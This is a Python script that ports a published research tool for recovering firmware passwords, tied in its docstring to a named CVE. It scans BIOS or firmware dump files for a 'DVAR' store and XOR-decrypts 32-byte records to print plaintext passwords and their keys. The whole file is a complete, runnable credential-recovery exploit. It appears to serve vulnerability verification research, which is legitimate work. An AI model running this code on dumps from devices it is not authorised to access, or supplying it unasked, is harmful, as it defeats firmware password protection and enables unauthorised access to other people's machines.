#!/usr/bin/env python3
"""dvar_scan_port.py — faithful Python port of dellpwn's DVAR+XOR scan.

Verifies, on our real forum-dump corpus (REPORT §13.9), the recovery
mechanism published as CVE-2026-40639 / DSA-2026-197 by AmberWolf
(Darren McDonald, @R3n5k1) and MDSec (Craig Blackie, @craigsblackie),
released as the Rust tool `dellpwn` (github.com/R3n5k1/dellpwn).

This port follows dellpwn src/dvar.rs (MIT) line-for-line for the primary
short-password path and all record filters:

  - find_dvar_region (dvar.rs:75): first "DVAR" signature, region +0x40000
  - recover_password_short (dvar.rs:87): key[0..10] from null-padded wrap
    region stored[21..31]; decrypt 1..12; find terminator (incl. DVAR
    obfuscation masks); re-extract authoritative key from stored[len..21];
    wrap-region cross-validation (<=5 mismatches); full re-decrypt; null
    region check (<=5 non-zero); 1 <= len <= 20
  - scan_for_passwords filters (dvar.rs:738): key entropy >= 8 unique,
    <= 2 zero key bytes, no byte value > 3 occurrences, <= 12 printable
    key bytes, <= 6 low-value key bytes, <= 4 zero stored bytes,
    wrap errors <= min(5, len/2+1), password length >= 3

Usage: python3 dvar_scan_port.py <dump.bin> [dump2.bin ...]
"""
import sys
from collections import Counter

OBFUSCATION_MASKS = {0x08, 0x10, 0x18, 0x20, 0x28, 0x40, 0x48}


def is_printable(b):
    return 0x20 <= b < 0x7f           # dvar.rs:17-19


def recover_password_short(stored):    # dvar.rs:87
    if len(stored) < 32:
        return None
    b0 = stored[0]
    if not is_printable(b0):
        return None
    # key[0..10] from wrap-around region (positions 21-31)
    key = [0] * 20
    for i in range(21, 32):
        key[(i - 1) % 20] = stored[i]
    # decrypt positions 1-11
    dec = [0] * 32
    dec[0] = b0
    for i in range(1, 12):
        dec[i] = stored[i] ^ key[(i - 1) % 20]
    # find null terminator within first 12 bytes (obfuscation-tolerant)
    pwd_len = 12
    for i in range(12):
        if dec[i] == 0:
            pwd_len = i
            break
        if not is_printable(dec[i]):
            if dec[i] in OBFUSCATION_MASKS:
                pwd_len = i
                break
            return None
    if pwd_len < 1:
        return None
    # authoritative key from null region
    if pwd_len <= 20:
        for i in range(pwd_len, 21):
            key[(i - 1) % 20] = stored[i]
    # cross-validate: wrap-region mismatches
    wrap_mismatches = 0
    if pwd_len < 11:
        for k in range(pwd_len, 11):
            if stored[k + 1] != key[k]:
                wrap_mismatches += 1
    for i in range(21, 32):
        if stored[i] != key[(i - 1) % 20]:
            wrap_mismatches += 1
    if wrap_mismatches > 5:
        return None
    # re-decrypt with corrected key, re-find terminator
    for i in range(1, 32):
        dec[i] = stored[i] ^ key[(i - 1) % 20]
    pwd_len = 32
    for i in range(32):
        if dec[i] == 0:
            pwd_len = i
            break
        if not is_printable(dec[i]):
            return None
    if pwd_len < 1 or pwd_len > 20:
        return None
    # verify null region
    null_nonzero = sum(1 for i in range(pwd_len + 1, 32) if dec[i] != 0)
    if null_nonzero > 5:
        return None
    return bytes(dec[:pwd_len]).decode('latin-1'), bytes(key)


def find_dvar_region(data):            # dvar.rs:75
    i = data.find(b"DVAR")
    if i < 0:
        return None
    return (i, min(i + 0x40000, len(data)))


def scan_for_passwords(data, start, end):   # dvar.rs:738
    results = []
    skip_until = 0
    scan_end = min(end, len(data) - 32)
    off = start
    while off < scan_end:
        if off < skip_until:
            off += 1
            continue
        rec = data[off:off + 32]
        r = recover_password_short(rec)
        if r:
            pw, key = r
            counts = Counter(key)
            if (len(set(key)) >= 8
                    and sum(1 for b in key if b == 0) <= 2
                    and max(counts.values()) <= 3
                    and sum(1 for b in key if is_printable(b)) <= 12
                    and sum(1 for b in key if b <= 0x0F) <= 6
                    and sum(1 for b in rec[1:] if b == 0) <= 4
                    and len(pw) >= 3):
                wrap_errors = sum(1 for i in range(21, 32)
                                  if rec[i] != key[(i - 1) % 20])
                if wrap_errors <= min(5, len(pw) // 2 + 1):
                    results.append((off, pw, key.hex()))
                    skip_until = off + 32
        off += 1
    return results


def scan_file(path):
    data = open(path, 'rb').read()
    region = find_dvar_region(data)
    if not region:
        return None, []
    return region, scan_for_passwords(data, *region)


def main():
    for path in sys.argv[1:]:
        region, results = scan_file(path)
        name = path.split('/')[-1]
        if not region:
            print(f"{name}: no DVAR store")
            continue
        print(f"{name}: DVAR store {region[0]:#x}-{region[1]:#x}"
              f"  passwords: {len(results)}")
        for off, pw, key in results:
            print(f"    [{off:#x}] {pw!r}  key={key}")


if __name__ == '__main__':
    main()
